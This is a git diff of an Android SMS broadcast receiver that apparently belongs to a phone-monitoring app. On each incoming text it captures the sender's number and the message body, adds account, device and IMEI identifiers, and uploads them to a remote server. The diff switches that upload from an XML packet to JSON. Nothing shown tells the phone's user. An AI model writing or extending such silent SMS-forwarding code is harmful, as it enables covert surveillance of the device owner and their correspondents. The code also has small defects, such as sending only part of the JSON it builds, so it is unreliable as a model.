@@ -3,6 +3,10 @@ package com.inet.android.sms;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import android.annotation.SuppressLint;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -17,6 +21,7 @@ import android.util.Log;
 
 import com.inet.android.bs.RequestMakerImpl;
 import com.inet.android.request.DataRequest;
+import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
 
@@ -27,8 +32,9 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 	SharedPreferences sp;
 	private Context mContext;
 	private Bundle mBundle;
-	String dir = null;
+	String type = null;
 	RequestMakerImpl req;
+	private String LOG_TAG = "SMSBroadcast";
 
 	public void onReceive(Context context, Intent intent) {
 		// Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
@@ -68,12 +74,13 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 
 	@SuppressLint("SimpleDateFormat")
 	private void getSMSDetails() {
+		ConvertDate date = new ConvertDate();
 		SmsMessage[] msgs = null;
 
 		try {
 			Object[] pdus = (Object[]) mBundle.get("pdus");
 			if (pdus != null) {
-				dir = "вх. Sms";
+				type = "5";
 				msgs = new SmsMessage[pdus.length];
 
 				StringBuilder bodyText = new StringBuilder();
@@ -92,25 +99,41 @@ public class SMSBroadcastReceiver extends BroadcastReceiver {
 									+ msgs[k].getOriginatingAddress());
 				
 				}
-				String adress = msgs[0].getOriginatingAddress();
+				String phNumber = msgs[0].getOriginatingAddress();
 
 				for (int i = 0; i < msgs.length; i++) {
 					bodyText.append(msgs[i].getMessageBody());
 				}
 				// -------send sms--------------------------------
-				String sendStr = "<packet><id>" + sp.getString("ID", "ID")
-						+ "</id><time>" + logTime()
-						+ "</time><type>4</type><app>" + dir + "</app><ttl>"
-						+ adress + "</ttl><cdata1>" + bodyText.toString()
-						+ "</cdata1><ntime>" + "30" + "</ntime></packet>";
+				String sendJSONStr = null;
+				JSONObject jsonObject = new JSONObject();
+				JSONArray data = new JSONArray();
+				JSONObject info = new JSONObject();
+				JSONObject object = new JSONObject();
+				try {
+					jsonObject.put("account", sp.getString("account", "0000"));
+					jsonObject.put("device", sp.getString("device", "0000"));
+					jsonObject.put("imei", sp.getString("imei", "0000"));
+					jsonObject.put("key", System.currentTimeMillis());
 
-//				req = new RequestMakerImpl(mContext);
-//				req.sendDataRequest(sendStr);
-				
+					info.put("tel", phNumber);
+					info.put("data", bodyText.toString());
+
+					object.put("time", date.logTime());
+					object.put("type",type);
+					object.put("info", info);
+					data.put(object);
+					jsonObject.put("data", data);
+					sendJSONStr = data.toString();
+				} catch (JSONException e) {
+					Logging.doLog(LOG_TAG, "json сломался", "json сломался");
+				}
+
 				DataRequest dr = new DataRequest(mContext);
-				dr.sendRequest(sendStr);
-				
-				Logging.doLog(TAG, sendStr, sendStr);
+				dr.sendRequest(sendJSONStr);
+
+				Logging.doLog(LOG_TAG = "SMSBroadcast", sendJSONStr, sendJSONStr);
+				Logging.doLog(LOG_TAG, sendJSONStr);				
 
 			}
 		} catch (Exception sfgh) {
